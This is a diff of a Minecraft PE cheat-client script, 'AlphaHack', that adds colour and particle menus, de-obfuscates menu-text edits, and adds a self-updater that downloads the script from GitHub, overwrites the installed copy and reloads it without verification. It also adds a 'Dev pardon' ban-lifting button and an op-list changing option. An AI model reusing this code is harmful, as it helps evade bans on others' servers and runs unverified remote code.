@@ -1,3 +1,4 @@
+var ModPE;
 //Ctx context
 
 var ctx = com.mojang.minecraftpe.MainActivity.currentMainActivity.get();
@@ -14,7 +15,7 @@ if(GetPort=="57788")sspam = false;
 /***********************/
 
 /*
-*    Authors: Arceus_matt, godsoft029.
+*   Authors: Arceus_matt, godsoft029, applqpak.
 *
 *    Started: MCPE v0.12.0
 *
@@ -52,10 +53,11 @@ var menu;
 //AlphaHack variables
 
 var num0  = 0;
-var version = "0.7.1";
+var version = "0.7.3";
 var name = "AlphαHαck";
 var authers = "ArceusMatt";
 var authers2 = "Godsoft029";
+var authers3 = "Applqpak";
 var copyright = "©";
 var text = "AlphaHack!";
 var space = " ";
@@ -97,8 +99,71 @@ var arrow = false;
 var exporb = false;
 var minecart = false;
 var deadchat = false;
+var nofly = false;
+var autod = false;
+var tspam = false;
+
+//ParticleType.angryVillager;
+var particle1 = false;
+//ParticleType.bubble;
+var particle2 = false;
+//ParticleType.cloud;
+var particle3 = false;
+//ParticleType.crit;
+var particle4 = false;
+//ParticleType.dripLava;
+var particle5 = false;
+//ParticleType.dripWater;
+var particle6 = false;
+//ParticleType.enchantmenttable;
+var particle7 = false;
+//ParticleType.fallingDust;
+var particle8 = false;
+//ParticleType.flame;
+var particle9 = false;
+//ParticleType.happyVillager;
+var particle10 = false;
+//ParticleType.heart;
+var particle11 = false;
+//ParticleType.hugeexplosion;
+var particle12 = false;
+//ParticleType.hugeexplosionSeed;
+var particle13 = false;
+//ParticleType.ink;
+var particle14 = false;
+//ParticleType.itemBreak;
+var particle15 = false;
+//ParticleType.lava;
+var particle16 = false;
+//ParticleType.mobFlame;
+var particle17 = false;
+//ParticleType.note;
+var particle18 = false;
+//ParticleType.portal;
+var particle19 = false;
+//ParticleType.rainSplash;
+var particle20 = false;
+//ParticleType.redstone;
+var particle21 = false;
+//ParticleType.slime;
+var particle22 = false;
+//ParticleType.smoke;
+var particle23 = false;
+//ParticleType.snowballpoof;
+var particle24 = false;
+//ParticleType.spell;
+var particle25 = false;
+//ParticleType.splash;
+var particle26 = false;
+//ParticleType.suspendedTown;
+var particle27 = false;
+//ParticleType.terrain;
+var particle28 = false;
+//ParticleType.waterWake;
+var particle29 = false;
 
 var GUIColor = Color.BLACK
+
 var GUIColor1 = Color.TRANSPARENT;
 var GUIColor2 = Color.BLACK;
 var GUIColor3 = Color.WHITE;
@@ -118,11 +183,92 @@ var GUIPos = Gravity.CENTER;
 
 var GUIBtns = Color.BLACK;
 
+var GUIBtns2 = Color.BLACK;
+var GUIBtns3 = Color.WHITE;
+var GUIBtns4 = Color.RED;
+var GUIBtns5 = Color.BLUE;
+var GUIBtns6 = Color.GRAY;
+var GUIBtns7 = Color.LTGRAY;
+var GUIBtns8 = Color.YELLOW;
+var GUIBtns9 = Color.CYAN;
+var GUIBtns10 = Color.DKGRAY;
+var GUIBtns11 = Color.GREEN;
+var GUIBtns12 = Color.MAGENTA;
+
 var GUISize = 3;
 
 /***********************/
 
-var _0xc359=["\x6D\x65\x6E\x75\x2E\x63\x6F\x70\x79\x72\x69\x67\x68\x74","\x4D\x6F\x6A\x61\x6E\x67\x20\x26\x20\x41\x72\x63\x65\x75\x73\x5F\x6D\x61\x74\x74\x27\x73\x20\x41\x6C\x70\x68\x61\x48\x61\x63\x6B\x21","\x6C\x61\x6E\x67\x45\x64\x69\x74","\x6D\x65\x6E\x75\x2E\x70\x6C\x61\x79","\xA7\x33\x50\x6C\x61\x79","\x6D\x65\x6E\x75\x2E\x6F\x70\x74\x69\x6F\x6E\x73","\xA7\x33\x53\x65\x74\x74\x69\x6E\x67\x73","\x6D\x65\x6E\x75\x2E\x73\x6B\x69\x6E\x73","\xA7\x33\x53\x6B\x69\x6E\x73","\x70\x6C\x61\x79\x73\x63\x72\x65\x65\x6E\x2E\x68\x65\x61\x64\x65\x72\x2E\x6C\x6F\x63\x61\x6C","\xA7\x33\x53\x65\x6C\x65\x63\x74\x20\x77\x6F\x72\x6C\x64","\x73\x6B\x69\x6E\x73\x2E\x74\x69\x74\x6C\x65","\x6F\x70\x74\x69\x6F\x6E\x73\x2E\x74\x69\x74\x6C\x65","\x64\x65\x61\x74\x68\x53\x63\x72\x65\x65\x6E\x2E\x6D\x65\x73\x73\x61\x67\x65","\xA7\x63\xA7\x6C\x57\x61\x73\x74\x65\x64","\x70\x6C\x61\x79\x73\x63\x72\x65\x65\x6E\x2E\x6E\x65\x77","\xA7\x33\x4E\x65\x77","\x70\x6C\x61\x79\x73\x63\x72\x65\x65\x6E\x2E\x71\x75\x69\x74","\xA7\x33\x42\x61\x63\x6B","\x73\x6B\x69\x6E\x73\x2E\x72\x65\x73\x74\x6F\x72\x65\x2E\x62\x75\x74\x74\x6F\x6E","\xA7\x33\x52\x65\x73\x74\x6F\x72\x65","\x63\x72\x65\x61\x74\x65\x57\x6F\x72\x6C\x64\x53\x63\x72\x65\x65\x6E\x2E\x61\x64\x76\x61\x6E\x63\x65\x64","\xA7\x33\x41\x64\x76\x61\x6E\x63\x65\x64","\x65\x78\x74\x65\x72\x6E\x61\x6C\x53\x65\x72\x76\x65\x72\x53\x63\x72\x65\x65\x6E\x2E\x61\x64\x64\x53\x65\x72\x76\x65\x72","\xA7\x33\x41\x64\x64\x20\x53\x65\x72\x76\x65\x72","\x6D\x75\x6C\x74\x69\x70\x6C\x61\x79\x65\x72\x2E\x70\x6C\x61\x79\x65\x72\x2E\x6A\x6F\x69\x6E\x65\x64","\xA7\x33\x25\x73\x20\x6A\x6F\x69\x6E\x65\x64\x20\x74\x68\x65\x20\x67\x61\x6D\x65","\x6D\x75\x6C\x74\x69\x70\x6C\x61\x79\x65\x72\x2E\x70\x6C\x61\x79\x65\x72\x2E\x6C\x65\x66\x74","\xA7\x33\x25\x73\x20\x6C\x65\x66\x74\x20\x74\x68\x65\x20\x67\x61\x6D\x65","\x64\x65\x61\x74\x68\x53\x63\x72\x65\x65\x6E\x2E\x71\x75\x69\x74","\xA7\x33\x4D\x61\x69\x6E\x20\x4D\x65\x6E\x75","\x64\x65\x61\x74\x68\x53\x63\x72\x65\x65\x6E\x2E\x72\x65\x73\x70\x61\x77\x6E","\xA7\x33\x52\x65\x73\x70\x61\x77\x6E","\x70\x61\x75\x73\x65\x53\x63\x72\x65\x65\x6E\x2E\x71\x75\x69\x74","\x70\x61\x75\x73\x65\x53\x63\x72\x65\x65\x6E\x2E\x6F\x70\x74\x69\x6F\x6E\x73","\x70\x61\x75\x73\x65\x53\x63\x72\x65\x65\x6E\x2E\x62\x61\x63\x6B","\xA7\x33\x42\x61\x63\x6B\x20\x74\x6F\x20\x67\x61\x6D\x65","\x6D\x65\x6E\x75\x2E\x72\x65\x74\x75\x72\x6E\x54\x6F\x47\x61\x6D\x65","\x64\x65\x61\x74\x68\x2E\x61\x74\x74\x61\x63\x6B\x2E\x6D\x6F\x62","\xA7\x33\x25\x31\x24\x73\x20\x77\x61\x73\x20\x73\x6C\x61\x69\x6E\x20\x62\x79\x20\x25\x32\x24\x73","\x64\x65\x61\x74\x68\x2E\x61\x74\x74\x61\x63\x6B\x2E\x66\x61\x6C\x6C","\xA7\x33\x25\x31\x24\x73\x20\x68\x69\x74\x20\x74\x68\x65\x20\x67\x72\x6F\x75\x6E\x64\x20\x74\x6F\x6F\x20\x68\x61\x72\x64","\x64\x65\x61\x74\x68\x2E\x61\x74\x74\x61\x63\x6B\x2E\x65\x78\x70\x6C\x6F\x73\x69\x6F\x6E","\xA7\x33\x25\x31\x24\x73\x20\x62\x6C\x65\x77\x20\x75\x70","\x64\x65\x61\x74\x68\x2E\x61\x74\x74\x61\x63\x6B\x2E\x61\x72\x72\x6F\x77","\xA7\x33\x25\x31\x24\x73\x20\x77\x61\x73\x20\x73\x68\x6F\x74\x20\x62\x79\x20\x25\x32\x24\x73","\x64\x65\x61\x74\x68\x2E\x61\x74\x74\x61\x63\x6B\x2E\x64\x72\x6F\x77\x6E","\xA7\x33\x25\x31\x24\x73\x20\x64\x72\x6F\x77\x6E\x65\x64","\x64\x65\x61\x74\x68\x2E\x66\x65\x6C\x6C\x2E\x61\x63\x63\x69\x64\x65\x6E\x74\x2E\x67\x65\x6E\x65\x72\x69\x63","\xA7\x33\x25\x31\x24\x73\x20\x66\x65\x6C\x6C\x20\x66\x72\x6F\x6D\x20\x61\x20\x68\x69\x67\x68\x20\x70\x6C\x61\x63\x65","\x64\x65\x61\x74\x68\x2E\x61\x74\x74\x61\x63\x6B\x2E\x6F\x75\x74\x4F\x66\x57\x6F\x72\x6C\x64","\xA7\x33\x25\x31\x24\x73\x20\x66\x65\x6C\x6C\x20\x6F\x75\x74\x20\x6F\x66\x20\x74\x68\x65\x20\x77\x6F\x72\x6C\x64","\x64\x65\x61\x74\x68\x2E\x61\x74\x74\x61\x63\x6B\x2E\x6F\x6E\x46\x69\x72\x65","\xA7\x33\x25\x31\x24\x73\x20\x62\x75\x72\x6E\x65\x64\x20\x74\x6F\x20\x64\x65\x61\x74\x68","\x64\x65\x61\x74\x68\x2E\x61\x74\x74\x61\x63\x6B\x2E\x6D\x61\x67\x69\x63","\xA7\x33\x25\x31\x24\x73\x20\x77\x61\x73\x20\x6B\x69\x6C\x6C\x65\x64\x20\x62\x79\x20\x6D\x61\x67\x69\x63","\x64\x65\x61\x74\x68\x2E\x61\x74\x74\x61\x63\x6B\x2E\x69\x6E\x57\x61\x6C\x6C","\xA7\x33\x25\x31\x24\x73\x20\x73\x75\x66\x66\x6F\x63\x61\x74\x65\x64\x20\x69\x6E\x20\x61\x20\x77\x61\x6C\x6C","\x64\x65\x61\x74\x68\x2E\x61\x74\x74\x61\x63\x6B\x2E\x6C\x61\x76\x61","\xA7\x33\x25\x31\x24\x73\x20\x74\x72\x69\x65\x64\x20\x74\x6F\x20\x73\x77\x69\x6D\x20\x69\x6E\x20\x6C\x61\x76\x61","\x64\x65\x61\x74\x68\x2E\x61\x74\x74\x61\x63\x6B\x2E\x69\x6E\x46\x69\x72\x65","\xA7\x33\x25\x31\x24\x73\x20\x77\x65\x6E\x74\x20\x75\x70\x20\x69\x6E\x20\x66\x6C\x61\x6D\x65\x73","\x64\x65\x61\x74\x68\x2E\x61\x74\x74\x61\x63\x6B\x2E\x63\x61\x63\x74\x75\x73","\xA7\x33\x25\x31\x24\x73\x20\x77\x61\x73\x20\x70\x72\x69\x63\x6B\x65\x64\x20\x74\x6F\x20\x64\x65\x61\x74\x68","\x63\x6F\x6D\x6D\x61\x6E\x64\x73\x2E\x6F\x70\x2E\x73\x75\x63\x63\x65\x73\x73","\xA7\x6C\x4F\x70\x70\x65\x64\x20\x25\x73","\x63\x6F\x6D\x6D\x61\x6E\x64\x73\x2E\x62\x61\x6E\x69\x70\x2E\x73\x75\x63\x63\x65\x73\x73","\xA7\x72\x42\x61\x6E\x6E\x65\x64\x20\x49\x50\x20\x61\x64\x64\x72\x65\x73\x73\x20\xA7\x6C\x25\x73","\x63\x6F\x6D\x6D\x61\x6E\x64\x73\x2E\x62\x61\x6E\x69\x70\x2E\x73\x75\x63\x63\x65\x73\x73\x2E\x70\x6C\x61\x79\x65\x72\x73","\xA7\x72\x42\x61\x6E\x6E\x65\x64\x20\x49\x50\x20\x61\x64\x64\x72\x65\x73\x73\x20\xA7\x6C\x25\x73\x20\xA7\x72\x62\x65\x6C\x6F\x6E\x67\x69\x6E\x67\x20\x74\x6F\x20\x25\x73","\x63\x68\x61\x74\x53\x63\x72\x65\x65\x6E\x2E\x68\x69\x64\x65","\xA7\x33\x48\x69\x64\x65","\xA7\x33\x42\x61\x63\x6B\x20\x74\x6F\x20\x47\x61\x6D\x65","\x6D\x65\x6E\x75\x2E\x70\x6C\x61\x79\x4F\x6E\x52\x65\x61\x6C\x6D\x73","\xA7\x33\x50\x6C\x61\x79\x20\x6F\x6E\x20\x52\x65\x61\x6C\x6D\x73","\x6D\x65\x6E\x75\x2E\x6D\x75\x6C\x74\x69\x70\x6C\x61\x79\x65\x72","\xA7\x33\x4D\x75\x6C\x74\x69\x70\x6C\x61\x79\x65\x72","\x6D\x65\x6E\x75\x2E\x6F\x6E\x6C\x69\x6E\x65","\xA7\x33\x4D\x69\x6E\x65\x63\x72\x61\x66\x74\x20\x52\x65\x61\x6C\x6D\x73","\x6D\x65\x6E\x75\x2E\x61\x63\x68\x69\x65\x76\x65\x6D\x65\x6E\x74\x73","\xA7\x33\x41\x63\x68\x69\x65\x76\x65\x6D\x65\x6E\x74\x73","\x61\x63\x74\x69\x6F\x6E\x2E\x69\x6E\x74\x65\x72\x61\x63\x74\x2E\x63\x72\x65\x61\x74\x65\x4D\x61\x70","\xA7\x33\x43\x72\x65\x61\x74\x65\x20\x4D\x61\x70","\x63\x72\x65\x61\x74\x65\x57\x6F\x72\x6C\x64\x53\x63\x72\x65\x65\x6E\x2E\x61\x63\x74\x69\x6F\x6E\x2E\x65\x64\x69\x74\x4C\x6F\x63\x61\x6C","\xA7\x33\x4D\x61\x6B\x65\x20\x49\x6E\x66\x69\x6E\x69\x74\x65\x21","\x63\x72\x65\x61\x74\x65\x57\x6F\x72\x6C\x64\x53\x63\x72\x65\x65\x6E\x2E\x61\x63\x74\x69\x6F\x6E\x2E\x6C\x6F\x63\x61\x6C","\xA7\x33\x43\x72\x65\x61\x74\x65\x20\x57\x6F\x72\x6C\x64\x21","\x63\x72\x65\x61\x74\x65\x57\x6F\x72\x6C\x64\x53\x63\x72\x65\x65\x6E\x2E\x61\x6C\x77\x61\x79\x73\x44\x61\x79","\xA7\x33\x41\x6C\x77\x61\x79\x73\x20\x44\x61\x79","\x63\x72\x65\x61\x74\x65\x57\x6F\x72\x6C\x64\x53\x63\x72\x65\x65\x6E\x2E\x64\x65\x6C\x65\x74\x65","\x44\x65\x6C\x65\x74\x65","\x63\x72\x65\x61\x74\x65\x57\x6F\x72\x6C\x64\x53\x63\x72\x65\x65\x6E\x2E\x67\x61\x6D\x65\x2E\x73\x65\x74\x74\x69\x6E\x67\x73","\xA7\x33\x47\x61\x6D\x65\x20\x53\x65\x74\x74\x69\x6E\x67\x73","\x63\x72\x65\x61\x74\x65\x57\x6F\x72\x6C\x64\x53\x63\x72\x65\x65\x6E\x2E\x67\x61\x6D\x65\x4D\x6F\x64\x65\x2E\x63\x72\x65\x61\x74\x69\x76\x65","\xA7\x33\x43\x72\x65\x61\x74\x69\x76\x65","\x63\x72\x65\x61\x74\x65\x57\x6F\x72\x6C\x64\x53\x63\x72\x65\x65\x6E\x2E\x67\x61\x6D\x65\x4D\x6F\x64\x65\x2E\x73\x75\x72\x76\x69\x76\x61\x6C","\xA7\x33\x53\x75\x72\x76\x69\x76\x61\x6C","\x63\x72\x65\x61\x74\x65\x57\x6F\x72\x6C\x64\x53\x63\x72\x65\x65\x6E\x2E\x68\x65\x61\x64\x65\x72\x2E\x6C\x6F\x63\x61\x6C","\xA7\x33\x43\x72\x65\x61\x74\x65\x20\x61\x20\x57\x6F\x72\x6C\x64"];ModPE[_0xc359[2]](_0xc359[0],_0xc359[1]);ModPE[_0xc359[2]](_0xc359[3],_0xc359[4]);ModPE[_0xc359[2]](_0xc359[5],_0xc359[6]);ModPE[_0xc359[2]](_0xc359[7],_0xc359[8]);ModPE[_0xc359[2]](_0xc359[9],_0xc359[10]);ModPE[_0xc359[2]](_0xc359[11],_0xc359[8]);ModPE[_0xc359[2]](_0xc359[12],_0xc359[6]);ModPE[_0xc359[2]](_0xc359[13],_0xc359[14]);ModPE[_0xc359[2]](_0xc359[15],_0xc359[16]);ModPE[_0xc359[2]](_0xc359[17],_0xc359[18]);ModPE[_0xc359[2]](_0xc359[19],_0xc359[20]);ModPE[_0xc359[2]](_0xc359[21],_0xc359[22]);ModPE[_0xc359[2]](_0xc359[23],_0xc359[24]);ModPE[_0xc359[2]](_0xc359[25],_0xc359[26]);ModPE[_0xc359[2]](_0xc359[27],_0xc359[28]);ModPE[_0xc359[2]](_0xc359[29],_0xc359[30]);ModPE[_0xc359[2]](_0xc359[31],_0xc359[32]);ModPE[_0xc359[2]](_0xc359[33],_0xc359[30]);ModPE[_0xc359[2]](_0xc359[34],_0xc359[6]);ModPE[_0xc359[2]](_0xc359[35],_0xc359[36]);ModPE[_0xc359[2]](_0xc359[37],_0xc359[36]);ModPE[_0xc359[2]](_0xc359[38],_0xc359[39]);ModPE[_0xc359[2]](_0xc359[40],_0xc359[41]);ModPE[_0xc359[2]](_0xc359[42],_0xc359[43]);ModPE[_0xc359[2]](_0xc359[44],_0xc359[45]);ModPE[_0xc359[2]](_0xc359[46],_0xc359[47]);ModPE[_0xc359[2]](_0xc359[48],_0xc359[49]);ModPE[_0xc359[2]](_0xc359[50],_0xc359[51]);ModPE[_0xc359[2]](_0xc359[52],_0xc359[53]);ModPE[_0xc359[2]](_0xc359[54],_0xc359[55]);ModPE[_0xc359[2]](_0xc359[56],_0xc359[57]);ModPE[_0xc359[2]](_0xc359[58],_0xc359[59]);ModPE[_0xc359[2]](_0xc359[60],_0xc359[61]);ModPE[_0xc359[2]](_0xc359[62],_0xc359[63]);ModPE[_0xc359[2]](_0xc359[64],_0xc359[65]);ModPE[_0xc359[2]](_0xc359[66],_0xc359[67]);ModPE[_0xc359[2]](_0xc359[68],_0xc359[69]);ModPE[_0xc359[2]](_0xc359[70],_0xc359[71]);ModPE[_0xc359[2]](_0xc359[37],_0xc359[72]);ModPE[_0xc359[2]](_0xc359[73],_0xc359[74]);ModPE[_0xc359[2]](_0xc359[75],_0xc359[76]);ModPE[_0xc359[2]](_0xc359[77],_0xc359[78]);ModPE[_0xc359[2]](_0xc359[79],_0xc359[80]);ModPE[_0xc359[2]](_0xc359[81],_0xc359[82]);ModPE[_0xc359[2]](_0xc359[83],_0xc359[84]);ModPE[_0xc359[2]](_0xc359[85],_0xc359[86]);ModPE[_0xc359[2]](_0xc359[87],_0xc359[88]);ModPE[_0xc359[2]](_0xc359[89],_0xc359[90]);ModPE[_0xc359[2]](_0xc359[91],_0xc359[92]);ModPE[_0xc359[2]](_0xc359[93],_0xc359[94]);ModPE[_0xc359[2]](_0xc359[95],_0xc359[96]);ModPE[_0xc359[2]](_0xc359[97],_0xc359[98])
+ModPE.langEdit("menu.copyright","Mojang & Arceus_matt's AlphaHack!");
+ModPE.langEdit("menu.play","§3Play");
+ModPE.langEdit("menu.options","§3Settings");
+ModPE.langEdit("menu.skins","§3Skins");
+/*ModPE.langEdit("playscreen.header.local","§3Select world");
+ModPE.langEdit("skins.title","§3Skins");
+ModPE.langEdit("options.title","§3Settings");*/
+ModPE.langEdit("deathScreen.message","§c§lWasted");
+ModPE.langEdit("playscreen.new","§3New");
+ModPE.langEdit("playscreen.quit","§3Back");
+ModPE.langEdit("skins.restore.button","§3Restore");
+ModPE.langEdit("createWorldScreen.advanced","§3Advanced");
+ModPE.langEdit("externalServerScreen.addServer","§3Add Server");
+ModPE.langEdit("multiplayer.player.joined","§3%s joined the game");
+ModPE.langEdit("multiplayer.player.left","§3%s left the game");
+ModPE.langEdit("deathScreen.quit","§3Main Menu");
+ModPE.langEdit("deathScreen.respawn","§3Respawn");
+ModPE.langEdit("pauseScreen.quit","§3Main Menu");
+ModPE.langEdit("pauseScreen.options","§3Settings");
+ModPE.langEdit("pauseScreen.back","§3Back to game");
+ModPE.langEdit("menu.returnToGame","§3Back to game");
+ModPE.langEdit("death.attack.mob","§3%1$s was slain by %2$s");
+ModPE.langEdit("death.attack.fall","§3%1$s hit the ground too hard");
+ModPE.langEdit("death.attack.explosion","§3%1$s blew up");
+ModPE.langEdit("death.attack.arrow","§3%1$s was shot by %2$s");
+ModPE.langEdit("death.attack.drown","§3%1$s drowned");
+ModPE.langEdit("death.fell.accident.generic","§3%1$s fell from a high place");
+ModPE.langEdit("death.attack.outOfWorld","§3%1$s fell out of the world");
+ModPE.langEdit("death.attack.onFire","§3%1$s burned to death");
+ModPE.langEdit("death.attack.magic","§3%1$s was killed by magic");
+ModPE.langEdit("death.attack.inWall","§3%1$s suffocated in a wall");
+ModPE.langEdit("death.attack.lava","§3%1$s tried to swim in lava");
+ModPE.langEdit("death.attack.inFire","§3%1$s went up in flames");
+ModPE.langEdit("death.attack.cactus","§3%1$s was pricked to death");
+ModPE.langEdit("commands.op.success","§lOpped %s");
+ModPE.langEdit("commands.banip.success","§rBanned IP address §l%s");
+ModPE.langEdit("commands.banip.success.players","§rBanned IP address §l%s §rbelonging to %s");
+ModPE.langEdit("chatScreen.hide","§3Hide");
+ModPE.langEdit("menu.returnToGame","§3Back to Game")
+ModPE.langEdit("menu.playOnRealms","§3Play on Realms");
+ModPE.langEdit("menu.multiplayer","§3Multiplayer")
+ModPE.langEdit("menu.online","§3Minecraft Realms");
+ModPE.langEdit("menu.achievements","§3Achievements");
+/*container.stonecutter=Stonecutter
+container.enderchest=Ender Chest
+container.furnace=Furnace
+container.hopper=Item Hopper
+container.inventory=Inventory
+container.beacon=Beacon
+container.brewing=Brewing Stand
+container.chest=Chest
+container.chestDouble=Large Chest
+container.crafting=Crafting
+container.creative=Item Selection
+container.dispenser=Dispenser
+container.dropper=Dropper
+container.enchant=Enchant
+cauldronScreen.header=Cauldron
+chestScreen.header.large=Large Chest
+chestScreen.header.player=Inventory
+chestScreen.header.small=Chest*/
+ModPE.langEdit("action.interact.createMap","§3Create Map");
+ModPE.langEdit("createWorldScreen.action.editLocal","§3Make Infinite!");
+ModPE.langEdit("createWorldScreen.action.local","§3Create World!");
+ModPE.langEdit("createWorldScreen.alwaysDay","§3Always Day");
+ModPE.langEdit("createWorldScreen.delete","Delete");
+ModPE.langEdit("createWorldScreen.game.settings","§3Game Settings");
+ModPE.langEdit("createWorldScreen.gameMode.creative","§3Creative");
+ModPE.langEdit("createWorldScreen.gameMode.survival","§3Survival");
+/*ModPE.langEdit("createWorldScreen.header.local","§3Create a World");*/
 
 /***********************/
 
@@ -213,10 +359,52 @@ print("New update! " + newUpdate);
 }
 
 function updateVersion() {
+                var ru  = new java.lang.Runnable() {
+                    run: function() {
+                        try {
+                            var urls = new java.net.URL("https://raw.githubusercontent.com/ArceusMatt/ALPHAHack/master/AlphaHack.js");
+                            var check = urls.openConnection();
+                            check.setRequestMethod("GET");
+                            check.setDoOutput(true);
+                            check.connect();
+                            check.getContentLength();
+                            var script = check.getInputStream();
+                            var typeb = java.lang.reflect.Array.newInstance(java.lang.Byte.TYPE, 1024);
+                            var byteCount = 0;
+                            while((byteCount = script.read(typeb)) != -1) { 
+                                updateMod += new java.lang.String(typeb, 0, byteCount);               
+                            }
+                            var modpeFolder = ctx.getDir("modscripts", 0);
+                            var modpeFile = new java.io.File(modpeFolder, "AlphaHack.js");
+                            var update = new java.io.PrintWriter(modpeFile);
+                            update.write(updateMod);
+                            update.flush();
+                            update.close();
+                             
+                            try {
+                                net.zhuoweizhang.mcpelauncher.ScriptManager.setEnabled(modpeFile, false);
+                                net.zhuoweizhang.mcpelauncher.ScriptManager.setEnabled(modpeFile, true);
+                                print(version + space + "Installed");
+                                   
+                            }
+                            catch(err) {
+                                print("Error: " + err);
+                            }
+                        }
+                        catch(err) {
+                            print("Error: " + err);
+                        }
+                    }
+                }
+                var threadt = new java.lang.Thread(ru);
+                threadt.start();
+            }
+
+/*function updateVersion() {
                 var urls = new Intent(ctx);                  urls.setAction(Intent.ACTION_VIEW);
                     urls.setData(Uri.parse("https://www.dropbox.com/s/k29sz9u27sgqnjr/ALPHAHack.js?dl=1"));
                     ctx.startActivity(urls);
-            }
+            }*/
 
 /***********************/
 
@@ -229,6 +417,27 @@ var bg64 = "iVBORw0KGgoAAAANSUhEUgAAAD8AAAA/CAYAAABXXxDfAAAABHNCSVQICAgIfAhkiAAA
 
 /***********************/
 
+function showSome(){
+ctx.runOnUiThread(new Runnable({ run: function(){
+    try{
+        var layout = new LinearLayout(ctx);
+        layout.setOrientation(1);
+        var menuNo = new Button(ctx);
+menuNo.setTextSize(1);
+        menuNo.setText("");
+        layout.addView(menuNo);
+ 
+        NO1 = new PopupWindow(layout, dip2px(5), dip2px(5)); 
+
+        NO1.setBackgroundDrawable(new ColorDrawable(Color.TRANSPARENT));
+        NO1.showAtLocation(ctx.getWindow().getDecorView(), Gravity.RIGHT | Gravity.TOP, 0, 0);
+        }catch(err){
+            Toast.makeText(ctx, "An error occured: " + err, 1).show();
+        }
+    }}));
+}
+showSome();
+
 function showMenuBtn(){
 ctx.runOnUiThread(new Runnable({ run: function(){
     try{
@@ -240,8 +449,11 @@ menuBtn.setTextSize(20);
         //menuBtn.setText("");
         menuBtn.setOnClickListener(new View.OnClickListener({
             onClick: function(viewarg){
+
 mainMenu();
-menuBtn = null;
+
+GUI.dismiss();
+
             }
         }));
         layout.addView(menuBtn);
@@ -276,7 +488,7 @@ var name = new TextView(ctx);
 
 var maker = new TextView(ctx);
             maker.setTextSize(15);
-            maker.setText(authers + space + "&" + space + authers2);
+            maker.setText(authers + space + "&" + space + authers2 + space + "&" + space + authers3);
             maker.setTextColor(GUIName);
             maker.setGravity(Gravity.CENTER);
             menuLayout.addView(maker);
@@ -425,7 +637,7 @@ var layout = new android.widget.LinearLayout(ctx);
 layout.setOrientation(1);
 
 alert.setTitle("Alphα Hαck" + space + version + space + "changelog");
- alert.setMessage(version + space + "Changelog:" + "\nAdded korean translate for enchant, added enchant menu, added clear inventory to give menu, added make food item to modpe menu, added see players on servers while offline to hack menu, added bug fixes, added water walk for servers in modpe menu, added contact creator in settings, added more sizes to settings, removed any script that was copied, always improving.");
+ alert.setMessage(version + space + "Changelog:" + "\nAdded particle menu, added tutorials for bans, added more modpe stuff, fixed settings.");
 
 alert.setPositiveButton("Exit all", new android.content.DialogInterface.OnClickListener(){ 
   onClick: function(viewarg){
@@ -535,7 +747,7 @@ GUISize = 1;
             }));
             lmenuLayout.addView(gs3);
 
-var l1 = new Button(ctx);
+            var l1 = new Button(ctx);
             l1.setText("Transparent Menu");       
             l1.setOnClickListener(new View.OnClickListener({
                 onClick: function(viewarg){         
@@ -650,6 +862,105 @@ GUIColor = GUIColor12
                 }
             }));
             lmenuLayout.addView(l12);
+
+ var b2 = new Button(ctx);
+            b2.setText("Black button text");       
+            b2.setOnClickListener(new View.OnClickListener({
+                onClick: function(viewarg){         
+GUIBtns = GUIBtns2
+                }
+            }));
+            lmenuLayout.addView(b2);
+
+var b3 = new Button(ctx);
+            b3.setText("White button text");       
+            b3.setOnClickListener(new View.OnClickListener({
+                onClick: function(viewarg){         
+GUIBtns = GUIBtns3
+                }
+            }));
+            lmenuLayout.addView(b3);
+
+var b4 = new Button(ctx);
+            b4.setText("Red button text");       
+            b4.setOnClickListener(new View.OnClickListener({
+                onClick: function(viewarg){         
+GUIBtns = GUIBtns4
+                }
+            }));
+            lmenuLayout.addView(b4);
+
+var b5 = new Button(ctx);
+            b5.setText("Blue button text");       
+            b5.setOnClickListener(new View.OnClickListener({
+                onClick: function(viewarg){         
+GUIBtns = GUIBtns5
+                }
+            }));
+            lmenuLayout.addView(b5);
+
+var b6 = new Button(ctx);
+            b6.setText("Gray button text");       
+            b6.setOnClickListener(new View.OnClickListener({
+                onClick: function(viewarg){         
+GUIBtns = GUIBtns6
+                }
+            }));
+            lmenuLayout.addView(b6);
+
+var b7 = new Button(ctx);
+            b7.setText("Lightgray button text");       
+            b7.setOnClickListener(new View.OnClickListener({
+                onClick: function(viewarg){         
+GUIBtns = GUIBtns7
+                }
+            }));
+            lmenuLayout.addView(b7);
+
+var b8 = new Button(ctx);
+            b8.setText("Yellow button text");       
+            b8.setOnClickListener(new View.OnClickListener({
+                onClick: function(viewarg){         
+GUIBtns = GUIBtns8
+                }
+            }));
+            lmenuLayout.addView(b8);
+
+var b9 = new Button(ctx);
+            b9.setText("Cyan button text");       
+            b9.setOnClickListener(new View.OnClickListener({
+                onClick: function(viewarg){         
+GUIBtns = GUIBtns9
+                }
+            }));
+            lmenuLayout.addView(b9);
+
+var b10 = new Button(ctx);
+            b10.setText("Darkgray button text");       
+            b10.setOnClickListener(new View.OnClickListener({
+                onClick: function(viewarg){         
+GUIBtns = GUIBtns10
+                }
+            }));
+            lmenuLayout.addView(b10);
+
+var b11 = new Button(ctx);
+            b11.setText("Green button text");       
+            b11.setOnClickListener(new View.OnClickListener({
+                onClick: function(viewarg){         
+GUIBtns = GUIBtns11
+                }
+            }));
+            lmenuLayout.addView(b11);
+
+var b12 = new Button(ctx);
+            b12.setText("Magenta button text");       
+            b12.setOnClickListener(new View.OnClickListener({
+                onClick: function(viewarg){         
+GUIBtns = GUIBtns12
+                }
+            }));
+            lmenuLayout.addView(b12);
 		
 		var exit2 = new android.widget.Button(ctx);
 		exit2.setText("Exit");
@@ -728,6 +1039,17 @@ showMenuBtn();
 			}
 		});
 		cmenuLayout.addView(exitb);
+
+var ddp = new android.widget.Button(ctx);
+            ddp.setText("Dev pardon");
+            ddp.setOnClickListener(new android.view.View.OnClickListener({
+                onClick: function(viewarg){
+devpardon();
+clientMessage(client + "§7You should be dev pardon now, if not restart MCPE");
+print("You should be dev pardon now, if not restart MCPE");
+                }
+            }));
+            cmenuLayout.addView(ddp);
 
 var s = new android.widget.Button(ctx);
             s.setText("Change oplist test");
@@ -816,7 +1138,7 @@ var layout = new android.widget.LinearLayout(ctx);
 layout.setOrientation(1);
 
 alert.setTitle("AlphaHack found sites");
